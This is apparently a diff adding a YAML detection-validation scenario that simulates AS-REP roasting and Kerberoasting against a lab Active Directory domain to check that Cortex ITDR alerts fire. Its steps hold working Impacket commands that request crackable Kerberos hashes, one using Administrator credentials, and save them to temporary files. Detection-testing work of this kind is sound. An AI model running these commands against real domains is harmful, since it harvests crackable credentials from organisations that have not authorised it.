@@ -1,0 +1,176 @@
+scenario_id: SIM-ITDR-006
+name: "ITDR — AD Offline Roasting Credential Harvest (AS-REP Roast + Kerberoast)"
+version: "1.0"
+status: active
+
+plane: ITDR
+detection_types:
+  - BIOC
+  - XQL
+  - Correlation
+
+uc_ref: UCS-ITDR-06
+tc_ref: TC-ITDR-06
+uc_name: "Kerberos Offline-Roasting Detection"
+tc_name: "AS-REP Roast + Kerberoast Harvest From A Single Source Against The Seeded AD Lab"
+
+mitre_tactic: "TA0006"
+mitre_tactic_name: "Credential Access"
+mitre_technique: "T1558.004"
+mitre_technique_name: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
+additional_techniques:
+  - technique: "T1558.003"
+    name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+  - technique: "T1087.002"
+    name: "Account Discovery: Domain Account"
+
+threat_report: "Unit42 - Active Directory Attack Paths"
+threat_report_url: "https://unit42.paloaltonetworks.com/active-directory-attack-paths/"
+
+execution_identity:
+  default: root
+  options:
+    - root
+
+push_supported: true
+pull_supported: true
+
+required_content:
+  - repo: "fortra/impacket"
+  - repo: "GhostPack/Rubeus"
+
+infra_modules_needed:
+  - base
+  - itdr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+# Rolled out per the S-07 per-plane convention (docs/uc_tc_mapping/
+# scenario-methodology-defaults.md). Identity-plane detection-accuracy family.
+validation_methodology: "Identity Attack Signal Injection & Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "Detection Accuracy"
+threshold:
+  kpi: "Detection Accuracy"
+  op: "≥"
+  value: 90
+  unit: "%"
+success_criteria: |
+  The AS-REP Roast and Kerberoast harvest steps each raise their expected
+  Cortex ITDR detection (pre-auth-disabled AS-REQ BIOC, servicePrincipalName
+  LDAP sweep BIOC, RC4 TGS-REQ burst BIOC), and the two techniques stitch into
+  one Credential Access incident via CR-ITDR-0006. Detection Accuracy is the
+  share of injected roasting events that raise the expected alert (target
+  ≥ 90%).
+moat_tier: "MOAT"
+
+# ── Consent / safety ────────────────────────────────────────────────────────
+# This scenario detonates real Impacket roasting tooling against the AD lab the
+# `itdr` IaC module provisions, so it references the dual-use-lab-only adapters
+# TOOL-IMPACKET and TOOL-RUBEUS. The orchestrator's adapter consent gate
+# (core/engine/orchestrator.py::_check_adapter_consent) REFUSES to launch
+# without consent.simulation_authorized=true. Each step also carries a
+# demo-mode fallback so the bundle is safe to run where the lab is absent (the
+# command echoes and exits 0 rather than erroring).
+
+external_tools:
+  - name: impacket
+    source: "https://github.com/fortra/impacket"
+    type: script
+    install_inline: false
+    adapter_ref: TOOL-IMPACKET
+  - name: Rubeus
+    source: "https://github.com/GhostPack/Rubeus"
+    type: binary
+    install_inline: false
+    adapter_ref: TOOL-RUBEUS
+
+steps:
+  - id: step-01
+    name: "Pre-flight: confirm the AD lab is reachable and roastable accounts are seeded"
+    command: |
+      echo '[ITDR-006] Pre-flight: AD lab reachability + roastable account check';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      echo "[*] Target domain: $DOMAIN via $DC_IP";
+      nslookup -type=SRV "_ldap._tcp.$DOMAIN" "$DC_IP" 2>&1 | head -5 || echo '[*] demo-mode: AD lab not reachable';
+      command -v impacket-GetUserSPNs >/dev/null 2>&1 && echo '[*] impacket present' || echo '[*] demo-mode: impacket not installed'
+    identity: root
+    mitre_technique: "T1087.002"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR — LDAP search filter (servicePrincipalName=*) from non-typical host (SPN enumeration precedes Kerberoast)"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "bioc-itdr-006-ldap-spn-sweep-from-non-typical-host"
+
+  - id: step-02
+    name: "AS-REP Roast: pull a crackable AS-REP for the pre-auth-disabled DA-equivalent account"
+    command: |
+      echo '[ITDR-006] AS-REP Roast — helpdesk-admin (DoesNotRequirePreAuth)';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      printf 'helpdesk-admin\n' > /tmp/cortexsim_itdr006_users.txt;
+      impacket-GetNPUsers "$DOMAIN/" -no-pass -usersfile /tmp/cortexsim_itdr006_users.txt -dc-ip "$DC_IP" -request -format hashcat 2>&1 | tee /tmp/cortexsim_itdr006_asrep.txt | head -10 || echo '[*] demo-mode: no AS-REP returned';
+      echo '[*] ITDR should flag an AS-REQ/4768 for a pre-auth-disabled account'
+    identity: root
+    mitre_technique: "T1558.004"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR — Kerberos AS-REQ (4768) for an account flagged DoesNotRequirePreAuth (AS-REP Roasting)"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "bioc-itdr-006-as-req-for-pre-auth-disabled-account-as-rep-roast"
+      - plane: ITDR
+        type: XQL
+        description: "ITDR — validation: AS-REQ for a pre-auth-disabled account observed in the last window"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "xql-itdr-006-validate-as-rep-roast-as-req-for-pre-auth-disabled-account"
+
+  - id: step-03
+    name: "Kerberoast: request RC4 TGS tickets for every seeded SPN service account"
+    command: |
+      echo '[ITDR-006] Kerberoast — request RC4 TGS for all SPN service accounts';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      ADMIN_PWD="${CORTEXSIM_ADMIN_PWD:-PlaceholderForDemo}";
+      impacket-GetUserSPNs "$DOMAIN/Administrator:$ADMIN_PWD" -dc-ip "$DC_IP" -request 2>&1 | tee /tmp/cortexsim_itdr006_tgs.txt | head -20 || echo '[*] demo-mode: no TGS returned';
+      echo '[*] ITDR should flag a 4769 TGS-REQ RC4 burst for >=3 distinct SPNs from one source'
+    identity: root
+    mitre_technique: "T1558.003"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR — Kerberos TGS-REQ RC4 (etype 0x17) burst for >=3 distinct service principals from one source (Kerberoasting)"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "bioc-itdr-006-kerberos-tgs-req-rc4-burst-for-multiple-spns"
+      - plane: ITDR
+        type: XQL
+        description: "ITDR — validation: 4769 TGS-REQ RC4 burst targeting >=3 SPNs from one source"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "xql-itdr-006-validate-kerberoast-tgs-req-rc4-burst"
+      - plane: NDR
+        type: XQL
+        description: "NGFW — Kerberos (port 88) traffic spike from the operator host to the DC"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "xql-itdr-006-ngfw-kerberos-port-88-traffic-spike-from-operator-host"
+      - plane: ITDR
+        type: Correlation
+        description: "XSIAM — AS-REP Roast + Kerberoast from one source stitched into a single Credential Access incident"
+        ttp_ref: "TTP-2026-0075"
+        detection_id: "CR-ITDR-0006"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/cortexsim_itdr006_users.txt /tmp/cortexsim_itdr006_asrep.txt /tmp/cortexsim_itdr006_tgs.txt"
+    - "echo '[CortexSim] SIM-ITDR-006 cleanup complete'"
+
+author: "Henry Reed"
+created: "2026-06-10"
+last_updated: "2026-06-10"
+tags:
+  - itdr
+  - active-directory
+  - kerberoast
+  - asrep-roast
+  - credential-access
+  - adapter-gated
